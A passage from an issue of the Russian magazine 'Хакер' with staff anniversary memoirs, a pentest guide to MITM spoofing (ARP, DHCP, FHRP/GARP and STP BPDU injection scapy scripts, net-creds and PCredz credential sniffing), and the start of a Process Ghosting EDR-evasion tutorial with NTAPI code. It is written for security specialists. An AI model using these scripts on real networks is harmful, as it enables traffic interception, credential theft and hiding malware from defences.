ший ся на ули це Льва Толсто го, за гонораром и экземпляром журнала,
в котором дей стви тель но была опуб ликована моя статья.
  На тот момент это была моя первая публикация в печатном издании,
и слож но передать те эмо ции, которые испы тыва ешь, впервые увидев свой
текст на бумаге. Впро чем, к это му в целом сложно привыкнуть. Например,
очень странно оказаться в давке вагона метро рядом с человеком, который
увле ченно читает твою статью в «Хакере», даже не подозревая, что автор сто-
ит прямо у него за спи ной. Бывало и такое.
  После первой «пробы пера» Олег предложил продолжить сотрудничество,
а я согласилась, ведь было чертовски интерес но. Тогда это, конечно, был
не фул тайм, и большинство авторов «Хакера» тог да в целом были фрилан-
серами. Одна ко со вре менем я ста ла принимать учас тие в пла ниро вании руб-
рики «Сцена», предлагать собственные идеи, под менять кол лег в других раз-
делах, вплоть до обзоров железа. И про должила писать в «Хакер» даже после
ухода Оле га, с которым мы потом еще успели поработать в игрожуре.
  А спустя нес колько лет (кажется, это было в 2008 году) меня попросили
о помощи: тогда мы по какой-то причине потеряли регулярного автора
MegaNews — новостей, с которых всег да открывался журнал. Это показа лось
мне интересным, хотя и весьма слож ным чел ленджем, и в результате новос-
ти, постепенно и незаметно, стали моей ежемесячной ответственностью,
да так и остались ею на долгие годы. И остаются по сей день, пусть уже в сов-
сем другом формате и ракур се.
  Вряд ли удастся уложить множес тво вос поминаний и теплую нос таль гию
за все прошедшие годы в рамки этого текста. К тому же тогда эта колонка
рискует прев ратиться  в монолог про  «атакующие корабли, пылающие
над Орионом» и «лучи Си, раз реза ющие мрак у ворот Тангейзера».
  Потому что я пом ню ночные раз говоры с Кри сом Каспер ски в Jabber, когда
тот делился сво ими впечатлениями о переезде в США. Пом ню, как Nikitozz
(Никита Кислицин) сроч но вызывал в редакцию, которая еще располагалась
рядом с офисом Яндекса, потому что требовалось немедленно внес ти правки
в текст. Пом ню, как обсужда ла рабочие вопросы с toxa (Антоном Карповым)
в аське, и он еще не был CISO Яндекса. Пом ню, как в Москву приезжал Сти-
вен Балмер. Пом ню, как брала интервью у осно вате ля Wikipedia. Помню,
как бумажный «Хакер» перестал существовать и казалось, что все закон-
чилось.
  Могла ли я представить, что случайно увиден ный в 2006 году пост в ЖЖ
определит то, чем я буду заниматься в 2024-м? Конечно, нет. Но, судя
по исто риям наших читателей, они тоже не представляли, что купленный ими
слу чай но или из любопытства «Хакер» определит их будущую профессию
и жизненный вектор. А таких среди вас немало. Чтобы убе диться в этом, дос-
таточно заглянуть в со сед нюю статью с отзывами и воспомина ниями читате-
лей.
  Могли ли все мы предста вить, что в 2024 году «Хакер» по-прежнему будет
выходить в новом формате, как полностью электрон ное издание, пос ле того
как «бумага» канет в Лету? Сно ва нет. Ведь вначале даже мно гим в редак ции
казалось, что это «не взлетит», что ничего не получится. Однако мы всё
еще здесь.
   Что дальше? Отве чать на такой воп рос сложно даже в лучшие времена,
а уж во времена вро де нынешних — почти невоз можно. Но у нас, как всегда,
множество планов, идей и проектов. Некоторые из них может заспойлерить
в соседней колонке Андрей Письмен ный, а может, при дется подождать
отдельных анонсов.
  Одно известно наверняка: мы про должим писать, создавая для вас статьи,
интерес ные и актуальные, обучающие и исследовательские, хардкор ные
и  для  начинающих. Кажется, сейчас,  когда поис ковые системы  тонут
в мусоре, генерируемом ИИ, а нейронки пишут пар шивые тексты обо всем
и ни о чем (как показывает нам яркий пример CNET), контент, создава емый
живыми людьми, дей ствитель но разбирающимися в теме, может стать даже
более ценен. Кто зна ет.
  Позволю себе подыто жить эту нос тальгичес кую заметку не менее носталь-
гической цитатой из сериала Firey, хорошо зна комо го многим гикам:


    — We’re still flying.
    — That’s not much.
    — It’s enough.





                         yambuto
                                Áèëüä-ðåäàêòîð

Каж дый читатель «Хакера» знаком с моей работой — вот уже шесть лет я
дизай ню обложки выпусков «Хакера», а последний год создаю еще и заг-
лавные иллюстра ции для статей. Забавно, что свою пер вую обложку я сде-
лала неожидан но для себя.





Тогда я была иллюстра тором на фрилансе и подрабаты вала в «Хакере»
ответственным редактором на полставки. Я следила за выходом публикаций,
про веряла, что бы иллюс тра ции были на мес те, выбивала готовые тексты
из редакторов руб рик и напоми нала всем обо всём. В том числе напоминала
нашему легендарному дизайнеру Алику о том, что пора сдавать оче редную
обложку.
  Он имел обыкновение пропадать неделями, но в тот Новый год он пропал
как-то совсем безнадеж но, как сквозь землю провалил ся. Тут-то редакция
и вспомнила, что есть я, человек, который умеет пользоваться графичес кими
редак торами.
   Как сейчас помню, я долго в ночи ковыря ла эту обложку с Санта-Кла-
усом — «64 подар ка для хакера». Я тог да тол ком не умела пользоваться век-
тором, свои иллюс трации рисовала в рас тре. Но для обложки мы выбрали
векторную кар тинку, на которой надо было перекомпоновать объ екты, изме-
нить лицо Санты и добавить на ноутбук кучу хакерских стикеров. Пришлось
экстренно разбираться!


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





                      Та самая первая обложка

Я тогда решила, что это был единичный случай, ког да мне пришлось потушить
горящий дед лайн. Но — кто бы мог подумать! — с тех пор все обложки
рисовала я, а наш Алик так и не вернулся к этому почетному занятию.





                Сувенирка «Хакера» на кон ференциях

За эти годы было мно го всего интерес ного: я делала не только обложки, но и
иллюс трации для дайджестов новостей, рисунки для футболок, стикеры, лис-
товки, стенды для выставки, в течение года заведовала сувенирным магази-
ном xakep.shop и даже «испекла» 3D-торт на юбилей журнала! И конеч но, я
почти ежедневно генерирую иллюс трации для ста тей в DALL-E 3 и Midjourney.
Да, работы стало больше, зато сайт и выпус ки «Хакера» в PDF стали кра-
сивее!
   Как и многие наши читатели, я листала «Хакер» с самых первых номеров.
Будучи еще ребенком, я мало что понима ла, кроме рассказов про ослика
и рубрики «Западлостроение». Спустя 25 лет уровень моего понимания ста-
тей в «Хакере» поч ти не изменился :) Зато я глубоко впитала его стиль и дух
и стараюсь под держи вать и развивать его.





Работать в «Хакере» мне очень нра вится, одна толь ко проб лема — мне зап-
рещают исполь зовать розовый цвет, потому что это «не круто». Читатель,
если ты тоже заложник крутос ти, но в глубине души любишь розовый цвет,
моргни дважды! Шутка (не шутка).





                Þðèé «yurembo» ßçåâ
                              Ïîñòîÿííûé àâòîð

Мое мировоз зре ние было сформировано 200 номеров тому назад. Начиная
с сотого номера «Хакера», я стал регулярно читать журнал, а пару номеров
спус тя офор мил подписку. В 2007-м это было жиз ненно важно, све жий номер
из газет ного киоска могли утащить другие охот ники за информацией. Она
ценилась намного дороже, чем сей час, по крайней мере достать нуж ные све-
дения было слож нее. А информацию от крутых кодеров и хакеров — тем
более. Еще некоторое время я выписы вал «IT-Спец». В нем была более серь-
езная инфа, ориентированная на бизнес.





                    Со тый номер «Хакера»

В то вре мя моим глав ным увлечением был гей мдев, впрочем, как и сейчас.
Тогда рынка игровых движков не было вооб ще, поэтому для каждой новой
игры движок разрабатывался практически с нуля. А поскольку в моду тогда
начинали входить онлайновые игры, раз работчикам, кроме низ коуровневых
интерфейсов ОС, полагалось знать базы данных, сетевые протоколы и про-
чее.
  Я тогда вынашивал идею написать книгу «Программирование трехмерных
игр на OpenGL». Но быстро был возвра щен с небес на землю ворчливыми
редак торами книжных издательств: мне посоветовали прежде написать нес-
колько статей в техничес кие издания, чтобы показать себя общественности,
понять, что такое писательство.
   Га зет ные киоски тогда были завалены компь ютерно-игровыми журналами.
Естественно, ни один из них не подходил для ста тей про кодинг. Тогда-то я
и смекнул, что для моих изощренных целей подойдет «Хакер». Помимо про-
чего, «Хакер» мне нравился тем, что туда писал Крис Касперски. Я уже был
зна ком с его книгами и был при ятно удивлен встре тить в «Хакере» его глу-
бокомысленные статьи. Иног да один жур нальный номер содержал по семь
ста тей Криса!
  Первой моей попыткой, к слову неудачной, была статья на тему «Прог-
рамми рование на Delphi под Oracle» в том же 2007 году. Александр Лозов-
ский, ветеран «Хакера», редак тор руб рики «Кодинг», отве тил мне отказом:
«Нашим читателям такая тема будет неин терес на. Придумай что-нибудь пок-
руче и обращайся снова». Я без сожаления выкинул эту статью в сеть. Пуб-
лике она понравилась, и ее быс тро рас тиражирова ли на разных ресур сах.
  В 2008 году впервые появи лась Express-версия Visual Studio, и вмес те
с  ней  в  Microsoft  продвигали  игровой  движок  DarkGDK  компании
TheGameCreators — как средство быстрой разработки виде оигр. Мне эта
тема оказалась близка, и я подумал, что аудитории «Хакера» будет интерес но
уви деть внутренности игрос троя. В июле 2008-го я написал для рубрики
«Кодинг» статью «Темное искусство игродела». Редак тор отве тил, что тема
интерес ная, статья хорошая, пой дет в печать. Я, обрадованный, накатал
еще три статьи в про должение темы игростроя.
  А потом вышел октябрьский номер с моей стать ей!





   Де сятый номер за 2008 год и титуль ная страница моей первой статьи

Поз же вышли остальные статьи моего первого журнального цик ла.





              Титульные страницы вто рой и треть ей статей

Так началось мое сот рудни чество с «Хакером»: я делал разные иссле дования
и писал статьи по ним. Статьи помога ли еще глубже поз навать интерес ные
мне технологии.
  За вре мя сотрудни чес тва с «Хакером» я в основном писал статьи для руб-
рики «Кодинг», а в последние годы переключился на «Взлом». Я рас смат-
ривал широчай ший набор тем: писал про прог раммирование для Windows
Phone, Kinect, Leap Motion, рассказывал про Torque 2D/3D, AGK, Eiﬀel, раз-
работ ку для macOS на Objective-C.
  Дол гое вре мя никого, кро ме Лозовского, из редакции я не знал. Шли
годы, я писал статьи, слал их Алек сандру на мыло, он мне что-то отвечал,
и этим наше сот рудни чество ограничивалось. Так бы все и продол жалось,
пока в один прекрасный момент Ирина Чер нова (в прошлом выпускающий
редак тор «Хакера») не приг ласила меня посетить редакцию. Я как раз был
в Мос кве на кон ференции игроделов DevGAMM, поэтому при нял приг-
лашение и при перся в редакцию, где меня жда ли Александр Лозовский и на
тот момент глав ный редактор Илья Русанен.





                        Yurembo и Dr. Klouniz

Че рез девять лет, прой дя вместе с «Хакером» огонь, воду и медные трубы,
наб равшись бесценного опыта, я с помощью изда тель ства «Солон-Пресс»
все-таки издал кни гу про геймдев: «Вол шебство момента вращения: Искусс-
тво разработ ки игр на движ ке Torque 2D». Она и вправду отличалась от пер-
воначальной задумки. За прошедшее время игровая индустрия изменилась,
появи лись  бесплатные  движ ки,  разработ ка  виде оигр  ста ла  быстрей,
в каком-то смыс ле проще, доступнее и конкурен тнее. Поэтому писать кни гу
про самостоятельное возведение игро вого движ ка с помощью OpenGL ста ло
не нуж но. Я для это го выбрал движок Torque 2D, который я использовал
в ряде ран них про ектов. Через год пос ле издания кни ги вышло ее второе,
дополненное, издание: «Как самому написать мобиль ную 2D-игру».
  Однознач но самый крутой проект, который мы подготови ли совмес тно
с редак цией «Хакера» за последнее время, — это публикация обновленной
книги Криса Касперски «Фундаментальные основы  хакерства». Многие
читате ли в ком ментариях к статьям оста вили полез ные замечания и советы,
пос лужившие улучшению ито говой бумаж ной кни ги. За что всем огромная
благодар ность!
ВЗЛОМ





MITM —  это  самая  импак тная  атака,
которую  можно   про вести   в   сети.
Но одновременно это и самая опасная тех-
ника    с    точки    зрения    рисков
для инфраструк туры. В этой статье я рас-               Caster                                                                                                      caster@exploit.org
скажу о том, как спуфить при пентесте, что-
бы ничего не сло мать по дороге и не устро-
ить DoS.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Нач нем с теории. Я покажу, какие параметры нуж ны для кор ректного про-
веде ния MITM. Эти настройки позволят тебе избе жать непреднамеренного
DoS.


ÌÀÐØÐÓÒÈÇÀÖÈß ÒÐÀÔÈÊÀ È ÍÅÐÀÇÁÎÐ×ÈÂÛÉ ÐÅÆÈÌ

Классика жанра: переключить свой интерфейс в promiscuous mode и раз-
решить маршрутизацию. Разрешение мар шрутизации — это вооб ще очень
важ ная настройка, так как без нее во время MITM трафик легитимных хос тов
будет упираться в твою ОС и даль ше не пройдет, а это вызовет DoS.


sudo ip link set dev eth0 promisc
sudo sysctl -w net.ipv4.ip_forward= 1

Также будет полезно отклю чить ICMP Redirect. При проведе нии MITM твоя
машина может генери ровать эти сообщения, что вызовет тре вогу сенсоров
систем IDS/IPS.


sudo sysctl -w net.ipv4.conf.all.accept_redirects= 0
sudo sysctl -w net.ipv6.conf.all.accept_redirects= 0


ÂÎÇÌÎÆÍÎÑÒÈ ÏÎÐÒÀ ÊÎÌÌÓÒÀÒÎÐÀ

Так или иначе при MITM ты будешь упирать ся в воз можнос ти пор та ком-
мутато ра.  Если  на  пор те  ком мутато ра  условно  пропускная  способ-
ность 1 Гбит/с, то выше этой отметки не прыгнуть. Поэтому не рекомендуется
спуфить слишком мно го хостов.


NAT HELPER, ÌÀÑÊÀÐÀÄÈÍÃ È ÅÃÎ ÏÎÁÎ×ÍÛÅ ÝÔÔÅÊÒÛ

Че рез тебя может проходить FTP, H.323 и дру гой трафик, который плохо
работа ет с NAT. Модуль nf_conntrack поможет про хождению трафика таких
про токо лов:


sudo modprobe nf_conntrack

Давай зададим правило NAT, которое поз волит видеть не толь ко вхо дящий
во вре мя MITM трафик, но еще и исходящий.


sudo iptables -t nat -A POSTROUTING -o eth0 -J MASQUERADE

Однако у этого правила может быть побочный эффект.
  Однажды мой коллега по цеху во время MITM как раз таки и нас троил
такое правило. В инфраструктуре заказчика были Zabbix-агенты, которые он
спуфил. И это правило привело к тому, что Zabbix-сервер больше не мог дос-
тучать ся до Zabbix-агентов, так как оно, по сути, спуфит адре са легитимных
хостов. Разуме ется, от такого внезап ного события сетевики были в шоке.


Ïîèñê ÷óâñòâèòåëüíûõ äàííûõ â ýôèðå
Ути литы net-creds и PCredz — полез нейшие инстру менты для удоб ного сбора
данных в эфи ре. Обычно их используют для того, что бы вытащить из трафика
пароли, NTLM-хеши, строки SNMP Community и дру гие интересные вещи.


sudo python2 net-creds -i eth0
sudo python3 ./Pcredz -i eth0


ßÄÐÎ LINUX

При MITM твое устрой ство должно быть готово к обработке большого
количества трафика. Можно немного затюнить ядро Linux для оптимальной
работы с боль шим количеством трафика, который ты будешь принимать
во вре мя спуфинга сети.


sudo sysctl -w fs.file-max=100000
sudo sysctl -w net.core.somaxconn = 65535
sudo sysctl -w net.core.netdev_max_backlog = 65536
sudo sysctl -w net.ipv4.tcp_fin_timeout= 15
sudo sysctl -w net.ipv4.tcp_tw_reuse= 1
sudo sysctl -w net.ipv4.tcp_tw_recycle= 1
sudo sysctl -w net.ipv4.tcp_max_tw_buckets=65536

Давай пройдем ся по каждой настрой ке:
 • net.core.somaxconn  =  65535  зада ет  максимальное  количество
   соеди нений, которые могут ожидать обра ботки в очереди. Это важно
   для при ложе ний с высокой нагрузкой, чтобы пре дотвра тить отбра сывание
   новых соединений из-за переполненной оче реди;
 • net.core.netdev_max_backlog = 65536 определяет максимальный
   размер очереди для сетевых устройств, обрабатывающих входящий тра-
   фик. Уве личе ние это го параметра поз воляет более эффективно обра-
   батывать пакеты в сетевом стеке;
 • net.ipv4.tcp_fin_timeout=15 — этот параметр устанавливает вре мя
   в секундах, в течение которого соединение ожи дает завершения пос ле
   отправ ки финишного пакета (FIN). Значение 15 секунд — компромисс
  между сво евре менным освобождением ресурсов и пре дотвращением
   возможных проблем с переиспользованием портов;
 • net.ipv4.tcp_tw_reuse=1 — ког да этот параметр установлен в еди-
   ницу,  он  раз решает  пов торное  использование  сокетов  TIME-WAIT
   для новых соединений. TIME-WAIT — это состояние, в котором сокет
   ждет, преж де чем пол ностью закрыться. Вклю чение этой опции позволя ет
   исполь зовать порты, находя щиеся в состоянии TIME-WAIT, для новых
   соеди нений, что может умень шить рас ход пор тов при высокой нагрузке;
 • net.ipv4.tcp_tw_recycle=1 — этот параметр акти виру ет режим пов-
   торно го использования сокетов TIME-WAIT. Включение этой опции поз-
   воляет ядру заново использовать сокеты TIME-WAIT, применяя хеш-фун-
  кцию для распре деления их по несколь ким очередям. Это может улучшить
   эффектив ность обра ботки сокетов TIME-WAIT в условиях высокой наг-
   рузки;
 • net.ipv4.tcp_max_tw_buckets=65536 — этот параметр устанав лива-
   ет максималь ное количество TIME-WAIT-сокетов, которые могут быть
   в очереди. Уве личе ние это го зна чения может предотвратить отбрасыва-
   ние сокетов TIME-WAIT в случае, если они пос тупают слиш ком быстро.


TCP Window Scaling
Параметр TCP Window Scaling управляет масштабированием окна TCP. Уве-
личе ние TCP-окна может улучшить производительность переда чи данных
в сети с высокой задер жкой или высокой наг рузкой.
  В TCP каждая сто рона устанавлива ет размер окна. Соот ветс твующее
количество байтов может быть отправлено без подтвержде ния. Window
Scaling пре дос тавляет возможность увеличи вать этот размер окна, что осо-
бенно полезно при работе с высокос коростными сетями.


sudo sysctl -w net.ipv4.tcp_window_scaling= 1


ÎÁÕÎÄ VLAN-ÑÅÃÌÅÍÒÀÖÈÈ (CISCO 2960)

Внутри локальной сети ата кующий может случайно напороться на транковый
порт. Чаще всего такое случается с ком мутаторами Cisco, за которы ми
недос таточ но доглядели в продакшене и не настроили как следует. Глав ная
проблема в том, что в коммутато рах Cisco 2960 по умол чанию все порты
включены и находятся в режиме DTP Dynamic Auto. Это может повлечь
за собой ата ку VLAN Hopping, при которой ата кующий выполняет инъекцию
кадра DTP Desirable.
  Инструмент Above поз волит обнаружить теги 802.1Q на транковом пор те
ком мутато ра. Затем ата кующий, зная о VLAN ID, соз даст виртуальные VLAN-
интерфейсы и прыг нет в другой VLAN-сег мент.


sudo apt install above
sudo above --interface eth0 --timer 300





                    Те ги 802.1Q в сетевых пакетах





          Об наружение 802.1Q-кадров с помощью Above

Также сниффинг кадров 802.1Q будет очень полезен при компро метации
гипервизора, посколь ку обычно гипервизор и находится на транковых
каналах.


DHCP SPOOFING, ÍÎ ÁÅÇ EXHAUSTION

Эта атака выглядит так. Ата кующий в своей ОС поднимает ложный DHCP-сер-
вер. Ата кующий может уже быть ближай шим DHCP-сервером, по сравнению
с легитимным DHCP-сервером, который обычно находится в дру гом сег-
менте, и тогда злоумышленни ку даже не нуж но применять сом нительный
DHCP Exhaustion. Почему сом нительный? Потому что это лиш нее негативное
воз действие на сеть. После такого пентеста сетевикам придется посетить
DHCP-серверы и почис тить Lease-таблицы. Если ты изучал эту MITM-ата ку,
наверняка пом нишь, что она упо мина лась вмес те с DHCP Exhaustion, однако
эта схе ма наносит сильный урон инфраструк туре.
  При таком виде спуфинга есть опас ность в виде DHCP Lease Time. Грубо
говоря, сколько длится таймер Lease Time, столько ты и дол жен обслуживать
поль зовате лей, так как ты ста новишься для них шлю зом по умолчанию. Если
же будет так, что ты выс тавил DHCP Lease Time условно на один день, а спу-
фить прекратишь через 30 минут, у легитимных клиентов воз никнет DoS. Они
запросят новую конфигурацию только спус тя день. Согласись, не очень при-
ятная ситуация.


ARP SCANNING

Во время пентеста будь осто рожен с инстру ментами, которые выполняют
ARP-сканиро вание. На уровне коммутации может быть нас троена система
Storm Control, которая заблокирует порт, если широковеща тель ный трафик
пре вышает заданный порог. Нужно про водить либо более медленное ска-
нирование (добавить задержку перед отправкой следующего ARP-кад ра),
либо пассивную разведку, при которой инструмент полагается толь ко на изу-
чение трафика (нап ример, так делает Netdiscover).


ARP SPOOFING

Это самый распространенный вид MITM, он представляет собой подделыва-
ние записей в ARP-таблицах. Таким образом атакующий навязы вает свой
адрес в качестве адре са шлю за.
  При про веде нии ARP-спуфинга следи за мас кой под сети, с которой
собираешься работать. Если ты возьмешь слишком большую маску, твое
железо может просто не выдержать нагрузки и возникнет DoS. Это час тая
ошибка в практике пентестеров. Будь осторожен с количес твом хостов,
которые ты собрался спуфить.
  Закончив спуфить хосты, ты должен генерировать и отправлять обратные
IS-AT-кадры, которые вос ста навливают состояние ARP-таб лиц хос тов до ата-
ки. Это очень важный момент. Хост или сер вис могут и не запросить ARP, тог-
да они будут думать, что ты все еще их шлюз. А это DoS. Это очень важный
момент, который стоит учи тывать. Кстати говоря, Ettercap и Arpspoof отлично
дела ют эту работу, а по окончании генери руют необ ходимые IS-AT-кадры
и вос станав ливают струк туру ARP-таб лиц хостов.


ÑÏÓÔÈÍÃ Â ÑÈÑÒÅÌÅ ÃÎÐß×ÅÃÎ ÐÅÇÅÐÂÈÐÎÂÀÍÈß FHRP

Это край не дер зкая MITM-атака: при спуфин ге FHRP-мастера весь трафик
сег мента пойдет в твою сторону, так как твой адрес будет адресом шлюза
по умол чанию для остальных легитимных хостов. Это рискованный вектор, так
как твое оборудо вание должно быть готово к такому мощному потоку тра-
фика.


Íåîáõîäèìîñòü èñïîëüçîâàòü GARP
При спуфин ге домена FHRP необ ходимо отпра вить специальный кадр
Gratuitous ARP, который уведомит весь сегмент о том, что возникла новая при-
вязка MAC-адреса и IP-адре са. Ведь при зах вате FHRP-мастера ты будешь
обслуживать его и отвечать за адрес шлюза по умол чанию для конечных хос-
тов.
   Вот Python-код, который будет генерировать и отправ лять GARP-кадр каж-
дые 300 секунд.


#!/usr/bin/env python3


from scapy.all import *
from scapy.layers.l2 import *
import argparse


l2broad = "FF:FF:FF:FF:FF:FF"


def take_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--gateway", dest="gateway", type=str,
required=True, help="Choose gateway IP address")
    parser.add_argument("--interface", dest="interface", type=str,
required=True, help="Choose your interface for attack")
    parser.add_argument("--mac", dest="evilmac", type=str, required=
True, help="Specify your MAC Address")
    args = parser.parse_args()
    return args


args = take_args()


def garp(gateway, interface, evilmac):
    ether_frame = Ether(src=args.evilmac, dst=l2broad)
    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac
, hwdst=l2broad, psrc=args.gateway)
    garp_frame = ether_frame / arp_frame
    sendp(garp_frame, iface=args.interface, inter=300, loop=1,
verbose=1)


garp(args.interface, args.evilmac, args.gateway)




                     Пол ный тех нический обзор атак на домены FHRP
                        я сделал в статье «FHRP Nightmare».



ÑÏÓÔÈÍÃ Â ÑÅÒÈ Ñ ÄÈÍÀÌÈ×ÅÑÊÎÉ ÌÀÐØÐÓÒÈÇÀÖÈÅÉ

MITM в домене динамической маршрутизации íå âîç ìîæåí . Если спуфить
адрес сервера, который находит ся в другом сегменте, возникнет просто-нап-
росто петля маршрутизации. Тра фик к хосту, который ты спуфишь, будет идти
по кругу: от легитимного хоста до твоего хоста и до шлюза по умол чанию.
  Однако есть вполне рабочий вектор Mocking-атаки, при которой ата-
кующий может подменить какую-нибудь служ бу в инфраструктуре путем
редистрибуции ста тического маршрута. Предположим, ты хочешь подделать
какую-нибудь служ бу SMB по адресу 10.1.1.33/32. Тогда тебе нужно нас-
троить соответствующий маршрут и распространить его по сети с помощью
редистрибуции.
  После такой инъекции тебе будет достаточ но установить этот адрес
на свой хост с помощью того же ifcong и запустить лож ный SMB-сервис, нап-
ример impacket. Это вро де какого-нибудь Evil Twin.
  Подробно эту атаку я разоб рал в своей статье «Evil Twin поверх динами-
ческой мар шрутизации».


ÑÏÓÔÈÍÃ ÄÅÐÅÂÀ STP

Суть этой атаки заключается в перехвате роли корневого коммутатора путем
инъекции кадра BPDU с наименьшим значением приоритета. Однако это при-
ведет лишь к частичной MITM-атаке.
   Вот пример рабочей BPDU-инъекции, которая позволит тебе отобрать
роль кор невого ком мутато ра. Опять же это при ведет только к ÷àñòè÷íîé
MITM-атаке. Не весь трафик в сети бегает через корневой коммутатор.
  Отправка такого кадра осу щест вля ется на муль тикас товый адрес STP —
01:80:C2:00:00:00.


from scapy.all import *


INTERFACE = "eth0"
ATTACKER_MAC = "00:11:22:33:44:55"
STP_MCAST = "01:80:C2:00:00:00"


def spoof():
    frame = Dot3(src=ATTACKER_MAC, dst=STP_MCAST)
    llc_layer = LLC(dsap=0x042, ssap=0x042, ctrl=3)
    mal_bpdu = STP(rootmac=ATTACKER_MAC, bpduflags=0x01, bridgemac=
ATTACKER_MAC)
    mal_stp_bpdu = frame / llc_layer / mal_bpdu
    sendp(mal_stp_bpdu, iface=INTERFACE, inter=2, loop=1, verbose=1)


spoof()




                  Методы защиты сети от спуфинг-атак я рас смот-
                       рел в статье «Save Me. Защищаем сети от спу-
                        финг-атак».



ÂÛÂÎÄÛ

В этой статье я рас сказал о рисках и о том, как спу фить сети правильно. Эта
статья — не пол ноценный мануал по спу фингу сетей, здесь описаны правила
хороше го тона, с помощью которых ты будешь проводить MITM без негатив-
ного воз действия на инфраструктуру. Понятное дело, что MITM — это очень
рас пространенная ата ка, о которой знают многие, но вопрос о том, как пра-
вильно спуфить без DoS, по-преж нему считается острым.
ВЗЛОМ





Различные спо собы скрытия работы своего
кода пос тоянно будоражат хакер ские умы.
В этой статье я покажу, как запускать про-
цессы  при  помощи   тех ники  Process
Ghosting, а затем разберем, как работают              Nik Zerof                                                                                              xtahi0nix@gmail.com
системы обнаружения вредоносного кода.


Как-то я уже рассказывал об одной подобной технике под названи ем Process
Doppelganging. С того времени появились другие, более современные тех-
ники запус ка кода под прикрыти ем легитим ных процессов.
   Process Ghosting — одна из наиболее актуальных в данный момент техник.
С ее помощью злоумышленник может организовать запуск сво его кода
из уже удаленного фай ла. Этот при ем час то используется в боевой малвари.
Но чтобы понять, как он работает, сначала разберем матчасть.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


В статье будут использовать ся функции NTAPI. Напоми наю, что их нельзя
прос то так вызывать, нужно получать их динамически из ntdll.dll. Один
из способов сде лать это я показывал в статье о Process Doppelganging
во врезке «Как пользоваться недокументированными NTAPI».


ÊÀÊ ÐÀÁÎÒÀÅÒ ÌÎÍÈÒÎÐÈÍÃ EDR (ENDPOINT DETECTION AND
RESPONSE)

Средства EDR часто монито рят соз дание про цессов при помощи разных
функций, например вот этих:
 • PsSetCreateProcessNotifyRoutineEx;
 • PsSetCreateProcessNotifyRoutineEx2;
 • PsSetCreateProcessNotifyRoutine.

Файл сканируется при запус ке, а точ нее — при создании процес са. Вот про-
тотипы перечисленных функций:


NTSTATUS PsSetCreateProcessNotifyRoutine(
  // Callback-функция обработчика
  [in] PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,
  [in] BOOLEAN Remove
);


NTSTATUS PsSetCreateProcessNotifyRoutineEx(
  // Callback-функция обработчика
  [in] PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  [in] BOOLEAN Remove
);


NTSTATUS PsSetCreateProcessNotifyRoutineEx2(
  // Callback-функция обработчика
  [in] PSCREATEPROCESSNOTIFYTYPE NotifyType,
  [in] PVOID NotifyInformation,
  [in] BOOLEAN Remove
);

Об рати вни мание: сканиро вание происходит имен но при запуске процесса,
а не в каких-то других случаях. Разумеется, дела ется это ради экономии
ресурсов, ина че сканирование всех файлов в системе заняло бы очень много
вре мени, осо бенно при операциях записи.
  Для EDR все идет по пла ну, если для соз дания процес са исполь зуется
функция NtCreateUserProcess (современный NTAPI, дос тупный со вре мен
Windows Vista), потому что она берет на себя почти всю работу по созданию
про цесса и первого потока. Все дей ствия происходят в ее контексте: соз-
дается   первый   поток   про цесса,   производится   вызов   кол бэков
из PsSetCreateProcessNotifyRoutineEx и так далее. На все это сложно
как-то повлиять с нашей сто роны. И именно при таком сценарии эффективны
защит ные средства EDR, потому что они рассчи тывают, что процесс будет
создан именно через NtCreateUserProcess.
   Этот вызов NTAPI исполь зуют и стан дартные API типа CreateProcess
(CreateProcess →  CreateProcessInternalW →  NtCreateUserProcess)
или      RtlCreateUserProcess          (RtlCreateUserProcessEx   →
RtlpCreateUserProcess → NtCreateUserProcess). То есть, гру бо говоря,
даже если ты пишешь код, используя WinAPI, что ред кость само по себе, то
все   равно   в   итоге   будет   вызвана   «правильная»   функция
NtCreateUserProcess, удовлетво ряющая требованиям средств EDR.
  Но  все  меняется,  если  процесс  создается  при помощи  функции
NtCreateProcessEx.  Она  ста рее  NtCreateUserProcess  и  оставлена
в Windows для обратной совместимости. Дело в том, что эта функция поз-
воля ет соз давать процесс в более «ручном» режиме, где можно влиять
на сам про цесс соз дания и запуска потоков из пользовательского режима.
В том числе это возможно, если подменять или уда лять файлы и процессы
или уста навливать нужные фла ги, что мы, собственно, и сде лали. Мы пришли
к тому, что наш исполняемый код остался только в памяти и избежал сканиро-
вания, потому что был уже уда лен с жесткого диска до соз дания его первого
потока.


ÊÎÄÈÌ!

Те оре тическая картина нам ясна, начнем прог раммировать. Давай пос-
мотрим, что нуж но, чтобы реали зовать Process Ghosting.
  Начинается все с соз дания времен ного фай ла, который мы потом удалим.
Я буду соз давать файл при помощи NTAPI-фун кции NtCreateFile  (не
забываем выдать права на удаление, запись и прочее). Разместим, само
собой, в пап ке для временных файлов.


HANDLE hProcess = INVALID_HANDLE_VALUE;
HANDLE hSection = INVALID_HANDLE_VALUE;
HANDLE hTempFile = INVALID_HANDLE_VALUE;
HANDLE hThread = INVALID_HANDLE_VALUE;


wchar_t filename[MAX_PATH] = { 0 };
wchar_t path_of_tempfile[MAX_PATH] = { 0 };
UNICODE_STRING file_name = { 0 };
IO_STATUS_BLOCK io_stat_block = { 0 };
OBJECT_ATTRIBUTES attributes = { 0 };


wstring nt_path = L"\\??\\" + wstring(filePath);


DWORD tempfile_size = GetTempPathW(MAX_PATH, path_of_tempfile);
GetTempFileNameW(path_of_tempfile, L"TEMP", 0, filename);


  if (tempfile_size > MAX_PATH || (tempfile_size == 0)) return 1;


RtlInitUnicodeString(&file_name, nt_path.c_str());


InitializeObjectAttributes(&attributes, &file_name,
OBJ_CASE_INSENSITIVE, NULL, NULL);


